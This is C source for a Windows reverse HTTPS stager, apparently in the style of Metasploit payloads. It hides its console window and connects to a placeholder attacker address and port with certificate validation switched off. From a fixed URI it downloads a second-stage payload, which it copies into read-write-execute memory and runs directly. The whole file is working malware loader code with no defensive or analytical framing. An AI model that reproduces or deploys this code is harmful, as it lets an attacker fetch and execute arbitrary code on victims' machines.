#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>

char reverse_ip[] = "AAA.AAA.AAA.AAA";
char reverse_port[] = "AAAAA";

#define HTTP_OPEN_FLAGS 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000
/*
  ;0x80000000 | ; INTERNET_FLAG_RELOAD
  ;0x04000000 | ; INTERNET_NO_CACHE_WRITE
  ;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
  ;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
  ;0x00000200 | ; INTERNET_FLAG_NO_UI
  ;0x00800000 | ; INTERNET_FLAG_SECURE
  ;0x00002000 | ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
  ;0x00001000   ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
*/

#define OPTIONS_SECURITY_FLAGS 0x00003380 
/*
    ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
    ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
    ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE
    ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
    ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
*/

int main(int argc, char * argv[]) {
	char * stage;
	void (*stage_main)();
	HINTERNET hInternet;
	HINTERNET hHttpSession;
	HINTERNET hHttpRequest;
	int httpflags = OPTIONS_SECURITY_FLAGS;
	int recv_tmp = 	0, recv_tot = 0;
	char *stage_index = NULL;
	
	/* We dont want the console prompt at screen */
	FreeConsole();
	
	/* Even it its SSL encrypted, lets set a User Agent, looks better :-) */
	hInternet = InternetOpen("User-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)", 0, NULL, NULL, 0);
	hHttpSession = InternetConnect(hInternet, reverse_ip, atoi(reverse_port), NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	/* URL format is *important*, don't change it ! It tells what kind of payload (Native, Python, Java ..) is going to be injected afterwords */
	hHttpRequest = HttpOpenRequest(hHttpSession, "GET", "/1f7MA", "HTTP/1.1", NULL, NULL, HTTP_OPEN_FLAGS, 0);
	/* Set SSL options to the HTTP request */
	InternetSetOption(hHttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &httpflags, 4);
	HttpSendRequest(hHttpRequest, NULL, 0, NULL, 0);
	
	/* We got the payload, lets allocate a big chunk of memory in RWX to put the whole thing in */
	stage = VirtualAlloc(0, 0x00400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	/* Read the payload from the previous http request and put it in our buffer */
	recv_tmp = 	1;
	recv_tot = 0;
	stage_index = stage;
		
	while (recv_tmp > 0) {
		InternetReadFile(hHttpRequest, stage_index, 8192, (PDWORD) &recv_tmp);
		recv_tot += recv_tmp;
		stage_index += recv_tmp;
	}
		
	/* Just jump at the beginning of the buffer */
	stage_main = (void (*)())stage;
	stage_main();

	/* We dont have to care about it, but anyway .. */
	InternetCloseHandle(hHttpSession);
	InternetCloseHandle(hInternet);

    return 0;
}
